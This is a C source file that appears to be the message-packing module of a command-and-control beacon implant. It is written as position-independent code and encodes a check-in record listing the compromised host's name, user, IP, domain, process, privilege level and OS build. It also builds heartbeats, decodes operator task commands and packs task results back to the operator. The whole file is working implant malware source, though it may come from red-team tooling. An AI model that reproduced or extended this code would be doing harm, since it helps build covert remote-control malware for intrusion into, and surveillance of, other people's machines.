/* beacon/src/Core/Packer.c
 * Wire-v0 frame encode / decode.  PIC port of agent/src/packer.c.
 * No CRT: uses MmCopy(__builtin_memcpy). Callers supply string lengths. */

#include "Macros.h"
#include "Wire.h"
#include "Instance.h"
#include "Nax.h"

/* ========= [ LE write helpers ] ========= */

FUNC VOID NaxW16( PBYTE p, UINT16 v ) {
    p[0] = (BYTE)( v & 0xFFu );
    p[1] = (BYTE)( ( v >> 8 ) & 0xFFu );
}

FUNC VOID NaxW32( PBYTE p, UINT32 v ) {
    p[0] = (BYTE)( v & 0xFFu );
    p[1] = (BYTE)( ( v >> 8 ) & 0xFFu );
    p[2] = (BYTE)( ( v >> 16 ) & 0xFFu );
    p[3] = (BYTE)( ( v >> 24 ) & 0xFFu );
}

FUNC UINT16 NaxR16( const PBYTE p ) {
    return (UINT16)p[0] | ( (UINT16)p[1] << 8 );
}

FUNC UINT32 NaxR32( const PBYTE p ) {
    return (UINT32)p[0] | ( (UINT32)p[1] << 8 ) | ( (UINT32)p[2] << 16 ) | ( (UINT32)p[3] << 24 );
}

/* ========= [ frame encode ] ========= */

FUNC INT NaxFrameEncode( BYTE        msg_type,
                         const PBYTE body, UINT32 body_len,
                         PBYTE out, UINT32* out_len ) {
    if ( *out_len < NAX_FRAME_HDR + body_len )
        return NAX_ERR_NOMEM;

    out[0] = msg_type;
    out[1] = 0;
    NaxW32( out + 2, body_len );
    if ( body_len > 0 && body != NULL )
        MmCopy( out + NAX_FRAME_HDR, body, body_len );
    *out_len = NAX_FRAME_HDR + body_len;
    return NAX_OK;
}

/* ========= [ frame decode ] ========= */

FUNC INT NaxFrameDecode( const PBYTE frame, UINT32 frame_len,
                         BYTE* msg_type, PBYTE* body,
                         UINT32* body_len ) {
    if ( frame_len < NAX_FRAME_HDR )
        return NAX_ERR_WIRE;
    UINT32 bl = NaxR32( frame + 2 );
    if ( NAX_FRAME_HDR + bl > frame_len )
        return NAX_ERR_WIRE;
    if ( msg_type )
        *msg_type = frame[0];
    if ( body )
        *body = (PBYTE)frame + NAX_FRAME_HDR;
    if ( body_len )
        *body_len = bl;
    return NAX_OK;
}

/* ========= [ REGISTER body ] ========= */

/* Builds REGISTER body (no outer frame header).
 * hn/un/ip/dom/proc are UTF-8 strings with explicit lengths. */
FUNC INT NaxBuildRegBody( PNAX_INSTANCE Nax, PNAX_SYSINFO info, PBYTE out, UINT32* out_len ) {
    UINT32 needed = 2 + info->HnLen + 2 + info->UnLen + 1 + 4 + 4 + 4 +
                    2 + info->IpLen + 2 + info->DmLen + 2 + info->PnLen +
                    1 + 4 + 4 + 2 + 4 + 4 + 4 + 2 + info->ImLen;
    if ( *out_len < needed ) return NAX_ERR_NOMEM;

    PBYTE p = out;
    NaxW16( p, (UINT16)info->HnLen );   p += 2; MmCopy( p, info->Hostname, info->HnLen );   p += info->HnLen;
    NaxW16( p, (UINT16)info->UnLen );   p += 2; MmCopy( p, info->Username, info->UnLen );   p += info->UnLen;
    *p++ = NAX_ARCH_X64;
    NaxW32( p, info->Pid );              p += 4;
    NaxW32( p, Nax->Config.SleepMs );    p += 4;
    NaxW32( p, info->Tid );              p += 4;
    NaxW16( p, (UINT16)info->IpLen );    p += 2; MmCopy( p, info->IpStr, info->IpLen );     p += info->IpLen;
    NaxW16( p, (UINT16)info->DmLen );    p += 2; MmCopy( p, info->Domain, info->DmLen );    p += info->DmLen;
    NaxW16( p, (UINT16)info->PnLen );    p += 2;
    if ( info->PnLen > 0 ) MmCopy( p, info->Procname, info->PnLen );
    p += info->PnLen;
    *p++ = Nax->Elevated;
    NaxW32( p, Nax->OsMajor );           p += 4;
    NaxW32( p, Nax->OsMinor );           p += 4;
    NaxW16( p, Nax->OsBuild );           p += 2;
    NaxW32( p, Nax->ParentPid );         p += 4;
    NaxW32( p, Nax->Acp );               p += 4;
    NaxW32( p, Nax->OemCp );             p += 4;
    NaxW16( p, (UINT16)info->ImLen );    p += 2;
    if ( info->ImLen > 0 ) MmCopy( p, Nax->ImgPath, info->ImLen );
    p += info->ImLen;

    *out_len = needed;
    return NAX_OK;
}

/* ========= [ HEARTBEAT frame ] ========= */

FUNC INT NaxBuildHeartbeat( PBYTE out, UINT32* out_len ) {
    return NaxFrameEncode( NAX_WIRE_HEARTBEAT, NULL, 0, out, out_len );
}

/* ========= [ TASK body decode ] ========= */

FUNC INT NaxDecodeTask( const PBYTE body, UINT32 body_len, NAX_TASK* t ) {
    /* TASK body: task_id(4) + cmd_id(1) + args_len(4) + args(n) = min 9 */
    if ( body_len < 9 )
        return NAX_ERR_WIRE;
    t->TaskId  = NaxR32( body );
    t->CmdId   = body[4];
    t->ArgsLen = NaxR32( body + 5 );
    if ( 9u + t->ArgsLen > body_len )
        return NAX_ERR_WIRE;
    t->Args = ( t->ArgsLen > 0 ) ? (PBYTE)body + 9 : NULL;
    return NAX_OK;
}

/* ========= [ RESULT frame ] ========= */

FUNC INT NaxBuildResult( UINT32      task_id,
                         BYTE        status,
                         const PBYTE data, UINT32 data_len,
                         PBYTE out, UINT32* out_len ) {
    if ( data_len > 0 && data == NULL )
        return NAX_ERR_INVAL;
    UINT32 body_len = 4 + 1 + 4 + data_len;
    UINT32 needed = NAX_FRAME_HDR + body_len;
    if ( *out_len < needed )
        return NAX_ERR_NOMEM;

    out[0] = NAX_WIRE_RESULT;
    out[1] = 0;
    NaxW32( out + 2, body_len );

    PBYTE p = out + NAX_FRAME_HDR;
    NaxW32( p, task_id );
    p += 4;
    *p++ = status;
    NaxW32( p, data_len );
    p += 4;
    if ( data_len > 0 )
        MmCopy( p, data, data_len );

    *out_len = needed;
    return NAX_OK;
}

